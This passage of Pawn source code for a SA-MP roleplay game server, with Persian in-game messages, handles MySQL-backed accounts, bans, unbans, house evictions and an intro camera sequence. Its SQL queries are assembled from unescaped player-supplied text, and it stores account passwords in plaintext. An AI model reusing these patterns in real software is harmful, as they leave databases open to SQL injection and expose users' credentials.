        }
    }
    /*
    for(new veh = 1; veh < MAX_VEHICLES; veh++)
{
    if(IsACopCar(veh))
    {
    if(!IsACop(playerid)) {
	SetVehicleParamsEx(veh,playerid,0,1);
	}
    }
}
*/
    if(OwnedMashin[vehicleid] == 1)
    {
        if(PlayerInfo[MashinOwner[vehicleid]][cLock] == 1)
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
        }
        if(PlayerInfo[MashinOwner[vehicleid]][cLock] == 0)
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,0);
        }
    }
    if(OwnedMashin_2[vehicleid] == 1)
    {
        if(PlayerInfo[MashinOwner_2[vehicleid]][cLock_2] == 1)
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
        }
        if(PlayerInfo[MashinOwner_2[vehicleid]][cLock_2] == 0)
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,0);
        }
    }
    if(MashinRenter[vehicleid] != INVALID_PLAYER_ID)
    {
        if(gCarLock[vehicleid] == 1)
        {
            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
        }
        if(gCarLock[vehicleid] == 0)
        {
            SetVehicleParamsForPlayer(vehicleid,forplayerid,0,0);
        }
    }
    return 1;
}
forward endchair(playerid);
public endchair(playerid)
{
LoopingAnim(playerid,"PED","SEAT_down",3.0,0,1,1,1,0);
AnimPlay[playerid] = 1;
return 1;
}
/*-----------------------------**MySQL System**-------------------------------*/
Public:BanOfflinePlayer(playerid, taraf[], days, reason[], UseIP)
{
    new rows = cache_get_row_count(handle);
    if(!rows && playerid == INVALID_PLAYER_ID) return 1;
    if(!rows) return SCM(playerid,COLOR_GG,"That player isn't exists.");
    new Name[MAX_PLAYER_NAME];
    if(IsPlayerConnected(playerid)) format(Name, MAX_PLAYER_NAME, PINFO[playerid][pName]);
    else format(Name, MAX_PLAYER_NAME, "AdmBot");
	new admin = cache_get_row_int(0,3,handle);
	if(admin > PINFO[playerid][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot ban an admin higher than you.");
    new query[256];
    new bantime[200];
    new sal, mah, rooz, saat, daqiqe, sanie;
    getdate(sal, mah, rooz);
    gettime(saat, daqiqe, sanie);
    sal -= 2000;
    format(bantime, 200, "%02d/%02d/%02d %02d:%02d:%02d", sal, mah, rooz, saat, daqiqe, sanie);
    if(days != 0) format(query, 256, "UPDATE `users` SET pBanned='1',pBanTime='%s',pBannedBy='%s',pBanReason='%s',pBanDays='%i' WHERE pName='%s'",bantime,Name,reason,days,taraf);
    else format(query, 256, "UPDATE `users` SET pBanned='2',pBanTime='%s',pBannedBy='%s',pBanReason='%s' WHERE pName='%s'",bantime,Name,reason,taraf);
    mysql_tquery(handle, query, "SendQuery", "");
    if(UseIP == 1)
    {
        if(days == 0)
        {
            new ip[50];
            cache_get_row(0, 114, ip, handle, 50);
            new query2[256];
            format(query2, 256, "INSERT INTO `banneds` (`IP`,`BannedBy`,`BannedReason`,`bannedtime`)VALUES ('%s','%s','%s','%s')",ip,Name,reason,bantime);
            mysql_tquery(handle, query2, "SendQuery", "");
        }
    }
    new string[300];
    if(days != 0) format(string, 300, "AdmCmd: Bazikon Offline %s Tavasote Admin %s Baraye %i Rooz Ban Shod , Dalil: %s",taraf,Name,days,reason);
    else format(string, 300, "AdmCmd: Bazikon Offline %s Be Tore Daem Tavasote Admin %s Ban Shod , Dalil: %s",taraf,Name,reason);
    SendClientMessageToAll(COLOR_LIGHTRED, string);
    return 1;
}
sqlconnect()
{
    handle = mysql_connect(sqlhost,sqluser,sqldb,sqlpass);
    if(!mysql_errno(handle)) print("-- Connected to MySQL Server successfully. --");
    else print("== Cannot connect to MySQL Server. ==");
    return 1;
}
Public:CheckAccount(playerid)
{
    new query[82];
    format(query, sizeof(query), "SELECT * FROM `users` WHERE `pName`='%s'", PlayerInfo[playerid][pName]);
    mysql_function_query(handle, query, true, "migamloginkon", "d", playerid);
    return 1;
}
stock LoadAccount(playerid)
{
    new query[128];
    format(query, sizeof(query), "SELECT * FROM `users` WHERE `pName`='%s'", PlayerInfo[playerid][pName]);
    mysql_function_query(handle, query, true, "OnPlayerLogin", "d", playerid);
}
stock CreateAccount(playerid,pass[])
{
    mysql_function_query(handle, "SELECT * FROM `users`",true,"OnPlayerGetID","is",playerid,pass);
}
Public:OnPlayerGetID(playerid,pass[])
{
    PINFO[playerid][pID] = cache_insert_id(handle);//Nemikhad save she
    new query[240];
    format(query, sizeof(query), "INSERT INTO `users` (pName, pKey, pID) VALUES (\'%s\', \'%s\', \'%i\')",PlayerInfo[playerid][pName], pass, PINFO[playerid][pID]);
    new string[256];
    format(string,256,"%s",pass);
    strmid(PlayerInfo[playerid][pKey],string,0,strlen(string),128);
    mysql_function_query(handle, query, false, "OnPlayerRegister", "i",playerid);
}

stock SaveKonStr(playerid, name[], str[])
{
    if(IsPlayerConnected(playerid) && gPlayerLogged[playerid] != 0)
    {
        new query[500];
        format(query, 500, "UPDATE `users` SET %s='%s' WHERE pName='%s'", name, str, PINFO[playerid][pName]);
        mysql_tquery(handle, query, "SendQuery", "");
    }
    return 1;
}

stock SaveKonVal(playerid, name[], value)
{
    if(IsPlayerConnected(playerid) && gPlayerLogged[playerid] != 0)
    {
        new query[500];
        format(query, 500, "UPDATE `users` SET %s='%d' WHERE pName='%s'", name, value, PINFO[playerid][pName]);
        mysql_tquery(handle, query, "SendQuery", "");
    }
    return 1;
}

stock SaveKonFloat(playerid, name[], Float:value)
{
    if(IsPlayerConnected(playerid) && gPlayerLogged[playerid] != 0)
    {
        new query[500];
        format(query, 500, "UPDATE `users` SET %s='%f' WHERE pName='%s'", name, value, PINFO[playerid][pName]);
        mysql_tquery(handle, query, "SendQuery", "");
    }
    return 1;
}

stock SaveKonValH(houseid, name[], value)
{
    new query[400];
    format(query, 400, "UPDATE `houses` SET %s='%i' WHERE hSQLID='%i'", name, value, houseid);
    mysql_tquery(handle, query, "SendQuery", "");
    return 1;
}

stock SaveKonStrH(houseid, name[], str[])
{
    new query[500];
    format(query, 500, "UPDATE `houses` SET %s='%s' WHERE hSQLID='%i'", name, str, houseid);
    mysql_tquery(handle, query, "SendQuery", "");
    return 1;
}
stock SaveKonStrC(cid, name[], str[])
{
    new query[500];
    format(query, 500, "UPDATE `clans` SET %s='%s' WHERE cSQLid='%i'", name, str, cid);
    mysql_tquery(handle, query, "SendQuery", "");
    return 1;
}
stock SaveKonValC(cid, name[], value)
{
    new query[500];
    format(query, 500, "UPDATE `clans` SET %s='%i' WHERE cSQLid='%i'", name, value, cid);
    mysql_tquery(handle, query, "SendQuery", "");
    return 1;
}
stock SaveKonFloatH(houseid, name[], Float:value)
{
    new query[450];
    format(query, 450, "UPDATE `houses` SET %s='%f' WHERE hSQLID='%i'", name, value, houseid);
    mysql_tquery(handle, query, "SendQuery", "");
    return 1;
}

CheckIfBanned(playerid)
{
    new query[256];
    format(query,256,"SELECT * FROM `users` WHERE pName='%s'",PlayerInfo[playerid][pName]);
    mysql_function_query(handle,query,true,"CheckBanned","i",playerid);
}
forward CheckBanned(playerid);
public CheckBanned(playerid)
{
    if(!cache_get_row_count(handle)) {return 0;}
    PBANNED[playerid] = 1;
    new banned,banreason[1000],bannedby[40],bannedtime[260],bandays;
    banned = cache_get_row_int(0,113,handle);
    cache_get_row(0,115,banreason,handle,1000);
    cache_get_row(0,117,bannedby,handle,40);
    cache_get_row(0,118,bannedtime,handle,260);
    bandays = cache_get_row_int(0, 172, handle);
    if(banned == 2)
    {
        for(new i = 0;i<100;i++) SCM(playerid,COLOR_WHITE," ");
        new sttr[1000];
        format(sttr,1000,"Shoma Be Tore Daem Tavasote %s Ban Shodid",bannedby);
        SCM(playerid,COLOR_BAN,sttr);
        format(sttr,1000,"Dalil Ban: %s (%s)",banreason,bannedtime);
        SCM(playerid,COLOR_BAN,sttr);
        KickWithMessage(playerid,COLOR_BAN," {FFFFFF}Baraye Ersal Darkhast Unban , Be ID Telegram {57e547}@Amunx{FFFFFF} PM Dahid");
    }
    else if(banned == 1)
    {
        new bool:IsBanned = true;
        new ssal[5], smah[5], srooz[5], ssaat[5], sdaqiqe[5], ssanie[5],timekol[128], usal, umah, urooz, usaat, csal, cmah, crooz, csaat, cdaqiqe, csanie;
        ssal[0] = bannedtime[0];
        ssal[1] = bannedtime[1];
        smah[0] = bannedtime[3];
        smah[1] = bannedtime[4];
        srooz[0] = bannedtime[6];
        srooz[1] = bannedtime[7];
        ssaat[0] = bannedtime[9];
        ssaat[1] = bannedtime[10];
        sdaqiqe[0] = bannedtime[12];
        sdaqiqe[1] = bannedtime[13];
        ssanie[0] = bannedtime[15];
        ssanie[1] = bannedtime[16];
        usaat = strval(ssaat)+(24*bandays);
        urooz = strval(srooz);
        umah = strval(smah);
        usal = strval(ssal);
        getdate(csal, cmah, crooz);
        gettime(csaat, cdaqiqe, csanie);
        for(new i;i<50;i++)
        {
            if(usaat >= 24)
            {
                usaat -= 24;
                urooz ++;
            }
        }
        for(new i;i<50;i++)
        {
            if(urooz >= GetDaysInMonth(umah, usal))
            {
                urooz -= GetDaysInMonth(umah, usal);
                umah ++;
            }
        }
        for(new i;i<50;i++)
        {
            if(umah >= 12)
            {
                umah -= 12;
                usal ++;
            }
        }
        format(timekol, 128, "%02d%02d%02d%02d", usal, umah, urooz, usaat);
        new unbanunix = strval(timekol);
        format(timekol, 128, "%02d%02d%02d%02d", csal-2000, cmah, crooz, csaat);
        new alanunix = strval(timekol);
        if(alanunix >= unbanunix) IsBanned = false;
        new timetodate[256];
        format(timetodate, 256, "%02d/%02d/%02d %02d:00:00", usal, umah, urooz, usaat);
        if(IsBanned == true)
        {
            new string[256];
            format(string, 256, "Shoma Az In Server Ban Shodid.");
            SCM(playerid,COL_SYN,string);
            format(string, 256, "Ban Shode Tavasote %s (%s) Dalil: %s",bannedby,bannedtime,banreason);
            SCM(playerid,COL_SYN,string);
            format(string, 256, "Shoma Dar Tarikhe %s Unban Mishavid",timetodate);
            SCM(playerid, COLOR_BAN, string);
            KickWithMessage(playerid,COLOR_BAN,"Sabr Konid Ta Zamane Mahromiat Shoma Tamam Shavad.");
            return 1;
        }
        else
        {
            new query[256];
            format(query, 256, "UPDATE `users` SET pBanned='0' WHERE pName='%s'", PINFO[playerid][pName]);
            mysql_tquery(handle, query, "SendQuery", "");
        }
    }
    return 0;
}
forward SendQuery();
public SendQuery()
{
    return 1;
}

BanPlayer(playerid, taraf[], days, reason[], UseIP = 1)
{
    new Name[MAX_PLAYER_NAME];
    if(IsPlayerConnected(playerid)) format(Name, MAX_PLAYER_NAME, PINFO[playerid][pName]);
    else format(Name, MAX_PLAYER_NAME, "AdmBot");
    new tarafid = ReturnUserEx(taraf);
    if(IsPlayerConnected(tarafid))
    {
		if(PINFO[tarafid][pAdmin] > PINFO[playerid][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot ban an admin higher than you.");
        if(days != 0) PINFO[tarafid][pBanned] = 1;
        else PINFO[tarafid][pBanned] = 2;
        SaveKonVal(tarafid, "pBanned", PINFO[tarafid][pBanned]);
        PINFO[tarafid][pBanDays] = days;
        SaveKonVal(tarafid, "pBanDays", PINFO[tarafid][pBanDays]);
        new bantime[200];
        new sal, mah, rooz, saat, daqiqe, sanie;
        getdate(sal, mah, rooz);
        gettime(saat, daqiqe, sanie);
        sal -= 2000;
        format(bantime, 200, "%02d/%02d/%02d %02d:%02d:%02d", sal, mah, rooz, saat, daqiqe, sanie);
        strmid(PlayerInfo[tarafid][pBanTime],bantime,0,strlen(bantime),80);
        SaveKonStr(tarafid, "pBanTime", bantime);
        strmid(PlayerInfo[tarafid][pBannedBy],Name,0,strlen(Name),40);
        SaveKonStr(tarafid, "pBannedBy", Name);
        strmid(PlayerInfo[tarafid][pBanReason],reason,0,strlen(reason),128);
        SaveKonStr(tarafid, "pBanReason", reason);
        if(UseIP == 1)
        {
            if(days == 0)
            {
                new query[256];
                format(query, 256, "INSERT INTO `banneds` (`IP`,`BannedBy`,`BannedReason`,`bannedtime`)VALUES ('%s','%s','%s','%s')",PINFO[tarafid][pIp],Name,reason,bantime);
                mysql_tquery(handle, query, "SendQuery", "");
            }
        }
        new stringt[300];
        if(days != 0) format(stringt, 300, "AdmCmd: %s Tavasote Admin %s Baraye %i Rooz Ban Shod , Dalil: %s",taraf,Name,days,reason);
        else format(stringt, 300, "AdmCmd: %s Be Tore Daem Tavasote Admin %s Ban Shod , Dalil: %s",taraf,Name,reason);
        SendClientMessageToAll(COLOR_LIGHTRED, stringt);
		SetTimerEx("BanPlayerTime",100, false, "i", tarafid);
    }
    else
    {
        new query[256];
        format(query, 256, "SELECT * FROM `users` WHERE pName='%s'",taraf);
        mysql_tquery(handle, query, "BanOfflinePlayer", "isisi", playerid, taraf, days, reason, UseIP);
    }
    return 1;
}
UnBanPlayer(bannerid,taraf[])
{
    new query[512];
    format(query,512,"SELECT * FROM `users` WHERE pName='%s'",taraf);
    mysql_tquery(handle, query, "OnPlayerUnBan", "is", bannerid, taraf);
    return 1;
}
public UpdatePlayerIntro(playerid) {
	if(!IsPlayerConnected(playerid)) { return 1; }

	new intro = pIntro[playerid];
	pIntro[playerid]++;
    CLS(playerid);

	switch(intro) {
	    case 1: {
	        SetPlayerTime(playerid, 10, 0);
		    PlayAudioStreamForPlayer(playerid, "http://10.201.76.237/Musics/start.mp3", 0, 0, 0, 0, 0);
	        CLS(playerid);
			for(new i=0;i<sizeof(IntroText1);i++) { TextDrawShowForPlayer(playerid, IntroText1[i]); }
		    SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 900+random(100));
		    SetTimerEx("UpdatePlayerIntro", 3450, false, "i", playerid);

		} case 2: {
		    for(new i=0;i<sizeof(IntroText1);i++) { TextDrawHideForPlayer(playerid, IntroText1[i]); }
		    for(new i=0;i<sizeof(IntroText2);i++) { TextDrawShowForPlayer(playerid, IntroText2[i]); }
		    SetTimerEx("UpdatePlayerIntro", 3450, false, "i", playerid);

		} case 3: {
		    for(new i=0;i<sizeof(IntroText2);i++) { TextDrawHideForPlayer(playerid, IntroText2[i]); }
	        for(new i=0;i<sizeof(IntroText3);i++) { TextDrawShowForPlayer(playerid, IntroText3[i]); }
			SetPlayerCameraPos(playerid, 1013.0536,-375.4480,78.9343);
			SetPlayerCameraLookAt(playerid, 1011.9162,-364.7888,78.9343);
			SetPlayerPos(playerid, 1043.6814,-290.2244,77.3594);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 4: {
			TextDrawHideForPlayer(playerid, IntroText3[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 5: {
			TextDrawHideForPlayer(playerid, IntroText3[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

    	} case 6: {
			TextDrawHideForPlayer(playerid, IntroText3[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 7: {
			TextDrawHideForPlayer(playerid, IntroText3[0]);
			InterpolateCameraPos(playerid, 1013.0536,-375.4480,78.9343,1013.0536,-375.4480,92.5807, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 1011.9162,-364.7888,78.9343, 1012.0640,-162.9103,92.2197, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

	    } case 8: {
			for(new i=0;i<sizeof(IntroText3);i++) { TextDrawHideForPlayer(playerid, IntroText3[i]); }
			for(new i=0;i<sizeof(IntroText4);i++) { TextDrawShowForPlayer(playerid, IntroText4[i]); }
			SetPlayerCameraPos(playerid, 1240.1117,342.9509,22.0650);
			SetPlayerCameraLookAt(playerid, 1251.1289,350.6477,23.6709);
			SetPlayerPos(playerid, 1255.2618,359.3845,23.5555);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 9: {
			TextDrawHideForPlayer(playerid, IntroText4[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 10: {
			TextDrawHideForPlayer(playerid, IntroText4[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 11: {
			TextDrawHideForPlayer(playerid, IntroText4[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 12: {
			TextDrawHideForPlayer(playerid, IntroText4[0]);
			InterpolateCameraPos(playerid, 1240.1117,342.9509,22.0650,1240.1117,342.9509,22.0650, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 1251.1289,350.6477,23.6709, 1250.5720,332.8492,20.2632, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

	    } case 13: {
			for(new i=0;i<sizeof(IntroText4);i++) { TextDrawHideForPlayer(playerid, IntroText4[i]); }
			for(new i=0;i<sizeof(IntroText5);i++) { TextDrawShowForPlayer(playerid, IntroText5[i]); }
			SetPlayerCameraPos(playerid, 6.8151,95.2203,6.2566);
			SetPlayerCameraLookAt(playerid, -1.2419,84.0238,6.6670);
			SetPlayerPos(playerid, -70.9413,32.9946,3.1172);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 14: {
			TextDrawHideForPlayer(playerid, IntroText5[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 15: {
			TextDrawHideForPlayer(playerid, IntroText5[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 16: {
			TextDrawHideForPlayer(playerid, IntroText5[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 17: {
			TextDrawHideForPlayer(playerid, IntroText5[0]);
			InterpolateCameraPos(playerid, 6.8151,95.2203,6.2566,6.8151,95.2203,17.9891, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, -1.2419,84.0238,6.6670, -80.8209,-20.2048,5.5981, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

	    } case 18: {
			for(new i=0;i<sizeof(IntroText5);i++) { TextDrawHideForPlayer(playerid, IntroText5[i]); }
			for(new i=0;i<sizeof(IntroText6);i++) { TextDrawShowForPlayer(playerid, IntroText6[i]); }
			SetPlayerCameraPos(playerid, 174.7467,-219.0446,7.7914);
			SetPlayerCameraLookAt(playerid, 157.6510,-201.6375,4.4745);
			SetPlayerPos(playerid, 167.7771,-224.9277,1.5781);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 19: {
			TextDrawHideForPlayer(playerid, IntroText6[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 20: {
			TextDrawHideForPlayer(playerid, IntroText6[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 21: {
			TextDrawHideForPlayer(playerid, IntroText6[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 22: {
			TextDrawHideForPlayer(playerid, IntroText6[0]);
			InterpolateCameraPos(playerid, 174.7467,-219.0446,7.7914,174.7467,-219.0446,7.7914, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 157.6510,-201.6375,4.4745, 207.7555,-204.0027,4.4745, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

        } case 23: {
			for(new i=0;i<sizeof(IntroText6);i++) { TextDrawHideForPlayer(playerid, IntroText6[i]); }
			for(new i=0;i<sizeof(IntroText7);i++) { TextDrawShowForPlayer(playerid, IntroText7[i]); }
			SetPlayerCameraPos(playerid, 682.5338,-491.8268,16.7630);
			SetPlayerCameraLookAt(playerid, 681.7215,-476.9990,16.3818);
			SetPlayerPos(playerid, 674.2264,-492.3217,16.7630);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 24: {
			TextDrawHideForPlayer(playerid, IntroText7[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 25: {
			TextDrawHideForPlayer(playerid, IntroText7[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 26: {
			TextDrawHideForPlayer(playerid, IntroText7[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 27: {
			TextDrawHideForPlayer(playerid, IntroText7[0]);
			InterpolateCameraPos(playerid, 682.5338,-491.8268,16.7630,688.8493,-502.7240,29.4752, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 681.7215,-476.9990,16.3818, 681.7070,-472.8073,27.6595, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

	    } case 28: {
			for(new i=0;i<sizeof(IntroText7);i++) { TextDrawHideForPlayer(playerid, IntroText7[i]); }
			for(new i=0;i<sizeof(IntroText8);i++) { TextDrawShowForPlayer(playerid, IntroText8[i]); }
			SetPlayerCameraPos(playerid, 1885.9117,235.1909,56.4599);
			SetPlayerCameraLookAt(playerid, 1658.4293,288.4257,30.1754);
			SetPlayerPos(playerid, 1921.9203,150.0674,37.2735);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 29: {
			TextDrawHideForPlayer(playerid, IntroText8[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 30: {
			TextDrawHideForPlayer(playerid, IntroText8[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 31: {
			TextDrawHideForPlayer(playerid, IntroText8[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 32: {
			TextDrawHideForPlayer(playerid, IntroText8[0]);
			InterpolateCameraPos(playerid, 1885.9117,235.1909,56.4599,1885.9117,235.1909,56.4599, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 1658.4293,288.4257,30.1754, 1928.2426,165.8895,40.4301, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

	    } case 33: {
			for(new i=0;i<sizeof(IntroText8);i++) { TextDrawHideForPlayer(playerid, IntroText8[i]); }
			for(new i=0;i<sizeof(IntroText9);i++) { TextDrawShowForPlayer(playerid, IntroText9[i]); }
			SetPlayerCameraPos(playerid, 1289.9395,239.7738,24.4394);
			SetPlayerCameraLookAt(playerid, 1282.8710,263.7049,24.4394);
			SetPlayerPos(playerid, 1264.9913,238.2751,31.1073);
	        SetTimerEx("UpdatePlayerIntro", 500, false, "i", playerid);

	    } case 34: {
			TextDrawHideForPlayer(playerid, IntroText9[3]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 35: {
			TextDrawHideForPlayer(playerid, IntroText9[2]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 36: {
			TextDrawHideForPlayer(playerid, IntroText9[1]);
			SetTimerEx("UpdatePlayerIntro", 250, false, "i", playerid);

        } case 37: {
			TextDrawHideForPlayer(playerid, IntroText9[0]);
			InterpolateCameraPos(playerid, 1289.9395,239.7738,24.4394,1280.8552,231.7017,38.3181, 7000, CAMERA_MOVE);
			InterpolateCameraLookAt(playerid, 1282.8710,263.7049,24.4394, 1306.0675,255.5159,32.1449, 7000, CAMERA_MOVE);
			SetTimerEx("UpdatePlayerIntro", 8000, false, "i", playerid);

        } case 38: {
			for(new i=0;i<sizeof(IntroText9);i++) { TextDrawHideForPlayer(playerid, IntroText9[i]); }
			for(new i=0;i<sizeof(IntroText10);i++) { TextDrawShowForPlayer(playerid, IntroText10[i]); }
			SetTimerEx("UpdatePlayerIntro", 6000, false, "i", playerid);

	    } case 39: {
	        for(new i=0;i<sizeof(IntroText10);i++) { TextDrawHideForPlayer(playerid, IntroText10[i]); }
			pIntro[playerid] = 0;
			RegisterSteps(playerid);
			fs(playerid);
			SpawnPlayer(playerid);

			} }
	return 1;
}
Public:OnPlayerUnBan(bannerid, taraf[])
{
    new rows = cache_get_row_count(handle);
    if(!rows) return SCM(bannerid, COLOR_GG,"In Name Sabt Nashode Ast.");
    new ip[50];
    cache_get_row(0, 114, ip, handle, 50);
    new query[512],string[128];
    format(query,512,"UPDATE `users` SET pBanned='0' WHERE pName='%s'",taraf);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,512,"DELETE FROM `banneds` WHERE IP='%s'",ip);
    mysql_function_query(handle,query,false,"SendQuery","");
	format(string, 256, "AdmWarning: {FFFFFF}%s has unbanned {FFFFFF}%s",PlayerName(bannerid),taraf);
	ABroadCast(COLOR_YELLOW,string,1);
//    format(string,sizeof(string),"{FFFFFF}%s {FF4500}Ba Movafaghiat UnBan Shod.",taraf);
//    SCM(bannerid,COLOR_ALI,string);
    ReadAccountBar();
    return 1;
}
CheckIfPBanned(playerid)
{
    new query[256];
    format(query,256,"SELECT * FROM `banneds` WHERE IP='%s'",PlayerInfo[playerid][pIp]);
    mysql_function_query(handle,query,true,"CheckPBanned","i",playerid);
    return 1;
}
forward CheckPBanned(playerid);
public CheckPBanned(playerid)
{
    if(!cache_get_row_count(handle)) {return 0;}
    PBANNED[playerid] = 1;
    new bannedby[40],banreason[1000],bannedtime[260];
    cache_get_row(0,1,bannedby,handle,40);
    cache_get_row(0,2,banreason,handle,1000);
    cache_get_row(0,3,bannedtime,handle,260);
    new sttr[200];
    for(new i = 0;i<100;i++) SCM(playerid,COLOR_WHITE," ");
    format(sttr,200,"You are Permanentaly banned from this server by %s",bannedby);
    SCM(playerid,COLOR_BAN,sttr);
    format(sttr,200,"Ban Reason: %s (%s)",banreason,bannedtime);
    SCM(playerid,COLOR_BAN,sttr);
    KickWithMessage(playerid,COLOR_BAN,"Type a unban info and Send it to {57e547}JoKeR GaminG {FFFFFF}  UnBan Topic.");
    return 1;
}
ReadAkharAcc()
{
mysql_function_query(handle,"SELECT * FROM `server`",true,"UpdateAkharinAcc","");
return 1;
}
UpdateAkharAcc(playerid)
{
new query[256];
format(query,256,"UPDATE `server` SET LastAccount='%s'",PlayerInfo[playerid][pName]);
mysql_function_query(handle,query,false,"SendQuery","");
ReadAccountBar();
return 1;
}
forward UpdateAkharinAcc();
public UpdateAkharinAcc()
{
    cache_get_row(0,3,jadidacc,handle,40);
    MostPlayersOnline = cache_get_row_int(0,4,handle);
    ReadTeadadeAcc();
    return 1;
}
ReadTeadadeAcc()
{
	mysql_function_query(handle,"SELECT * FROM `users`",true,"ReadTeadadeAccount","");
	return 1;
}
ReadTeadadeBan()
{
	mysql_function_query(handle,"SELECT * FROM `banneds`",true,"ReadTeadadeBanneds","");
	return 1;
}
forward ReadTeadadeBanneds();
public ReadTeadadeBanneds()
{
	teadadeban = cache_get_row_count(handle);
	new hour,minute,sec,day,month,year;
	gettime(hour,minute,sec);
	getdate(year,month,day);
	new accstr[700];
/*	format(accstr,700,"Accounts: ~y~%s ~w~(~y~%s ~w~banned) / Newest account: ~y~%s ~w~/ Most players online: ~y~%d ~w~(%s)",FormatNumber(teadadacc),FormatNumber(teadadeban),jadidacc,MostPlayersOnline,DateOfRekord);
	TextDrawSetString(AccountBar,accstr);*/
	format(accstr,sizeof(accstr),"%d",FormatNumber(teadadacc));
	TextDrawSetString(atxd[5],accstr);
	format(accstr,sizeof(accstr),"%d",FormatNumber(teadadeban));
	TextDrawSetString(atxd[6],accstr);
	format(accstr,sizeof(accstr),"%s",jadidacc);
	TextDrawSetString(atxd[7],accstr);
	format(accstr,sizeof(accstr),"%d",MostPlayersOnline);
	TextDrawSetString(atxd[8],accstr);
	return 1;
}
forward ReadTeadadeAccount();
public ReadTeadadeAccount()
{
	teadadacc = cache_get_row_count(handle);
	ReadTeadadeBan();
	return 1;
}
ReadAccountBar()
{
    ReadAkharAcc();
}
RegisterSteps(playerid)
{
    PlayerPlaySound(playerid, 1069, 0.0, 0.0, 0.0);
    gOoc[playerid] = 1; gNews[playerid] = 1; gFam[playerid] = 1;
    SetPlayerPosEx(playerid, 1611.612548,-2177.123779,13.554687);
    SetPlayerFacingAngle(playerid, 3.41);
    SetPlayerVirtualWorld(playerid, (playerid + 1));
    TogglePlayerSpectating(playerid,1);
    SetPlayerKhoon(true, playerid, 100.0);
    TogglePlayerControllable(playerid, 0);
    Mahal[playerid] = 9999;
    TooHouse[playerid] = 9999;
    TooBiz[playerid] = 9999;
    ShowPlayerDialog(playerid,418,DIALOG_STYLE_MSGBOX,"Language/Zaban","Please select a language to continue the registration step.","Persian", "English");
    return 1;
}
EvictAllFromPlayerHouse(playerid)
{
    if(PINFO[playerid][pPhousekey] == 9999) return SCM(playerid,COLOR_Good,"You don't own a house.");
    for(new i = 0;i<LastPID;i++)
    {
        if(IsPlayerConnected(i) && gPlayerLogged[i] == 1)
        {
            if(PINFO[i][pPhousekey] == PINFO[playerid][pPhousekey] && i != playerid)
            {
                PINFO[i][pPhousekey] = 9999;
                SaveKonVal(i, "pPhousekey", 9999);
                if(PINFO[i][gParked] == 1)
                {
                    CreateVehGarage(i);
                    SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
                }
                if(PINFO[i][gParked_2] == 1)
                {
                    CreateVehGarage_2(i);
                    SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
                }
            }
        }
    }
    new
        query[ 512 ]
                    ;
    format(query, sizeof(query), "UPDATE `users` SET pPhousekey='9999',gParked='0',gParked_2='0' WHERE pName<>'%s' AND pPhousekey='%d'", PINFO[playerid][pName], PINFO[playerid][pPhousekey]);
    mysql_function_query(handle,query,false,"SendQuery","");
    SCM(playerid,COLOR_Good,"All renters evicted from your house.");
    return 1;
}
EvictAllFromHouse(houseid)
{
    for(new i = 0;i<LastPID;i++)
    {
    if(IsPlayerConnected(i) && gPlayerLogged[i] == 1)
    {
    if(PINFO[i][pPhousekey] == houseid)
    {
